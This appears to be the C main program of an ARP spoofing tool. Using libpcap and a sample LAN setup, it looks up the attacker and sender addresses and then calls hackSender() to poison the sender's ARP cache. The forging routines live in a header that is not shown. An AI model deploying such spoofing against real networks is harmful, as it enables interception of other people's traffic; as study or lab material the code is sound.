#include <stdio.h>
#include <memory.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include "module.h"

void usage() {
  printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
  printf("sample: ex : send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char * dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  uint8_t * sender_ip = parseIP(argv[2]);
  uint8_t * target_ip = parseIP(argv[3]);
  printf("Sender ip : %s", printIPAddress(sender_ip));
  printf("Target ip : %s", printIPAddress(target_ip));

  uint8_t * attaker_ip = parseIP(getAttackerIPAddress(dev));
  printf("Attaker ip : %s\n", printIPAddress(attaker_ip));

  u_char * attacker_mac_address = getAttackerMacAddress(dev);
  printf("Attacker Mac Address : %s", printMacAddress(attacker_mac_address));

  u_char * sender_mac_address = getSenderMacAddress(handle, attacker_mac_address, attaker_ip, sender_ip);
  printf("Sender Mac Address : %s", printMacAddress(sender_mac_address));

  hackSender(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);

  passTest(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip);

  pcap_close(handle);
  return 0;
}